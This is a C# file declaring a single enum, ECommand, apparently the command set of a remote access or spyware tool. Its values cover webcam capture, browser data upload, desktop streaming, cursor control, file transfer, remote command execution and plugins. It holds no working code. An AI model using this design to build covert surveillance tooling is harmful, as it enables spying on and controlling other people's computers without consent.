using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Library
{
    public enum ECommand
    {
        UPLOAD_IMAGE,
        UPLOAD_SENTENCES,
        UPLOAD_WEBCAM_IMAGE,
        EXECUTE_COMMAND,
        UPLOAD_PORT_INFO,
        UPLOAD_BROWSER_DATA,
        DOWNLOAD_FILE,
        UPLOAD_FILE,
        UPLOAD_FILE_EVENTS,
        STREAM_DESKTOP,
        STOP_STREAM_DESKTOP,
        MOVE_CURSOR,
        DO_NOTHING,
        SET_TRANSMISSION_INTERVAL,
        EXECUTE_PLUGIN,
        KILL_PLUGIN,
        UPLOAD_PLUGIN
    }
}
